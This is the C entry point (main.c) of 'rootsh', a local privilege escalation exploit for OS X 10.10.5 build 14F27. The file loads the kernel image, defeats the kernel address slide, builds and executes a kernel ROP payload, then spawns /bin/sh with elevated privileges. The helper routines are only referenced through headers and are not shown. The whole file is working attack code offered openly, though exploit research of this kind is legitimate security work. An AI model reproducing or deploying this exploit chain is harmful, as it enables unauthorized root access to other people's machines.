/* main.c
 * Brandon Azad
 *
 * Entry point for rootsh, a local privilege escalation on OS X 10.10.5 build
 * 14F27.
 */

#include "kernel_image.h"
#include "kernel_slide.h"
#include "kernel_rop.h"

#include <stdio.h>
#include <unistd.h>

int
main(int argc, char * argv[]) {
	if ((uint32_t)main < 0x8000) {
		execve(argv[0], argv, NULL);
	}
	sync(); /* Finalize any writes to the filesystem in case we crash. */
	int err = load_kernel();
	if (err) {
		return err;
	}
	err = find_kernel_slide();
	if (err) {
		return err;
	}
	err = build_rop_payload();
	if (err) {
		return err;
	}
	err = execute_rop_payload();
	if (err) {
		return err;
	}
	argv[0] = "/bin/sh";
	execve(argv[0], argv, NULL);
	printf("error: could not exec shell\n");
	return 1;
}
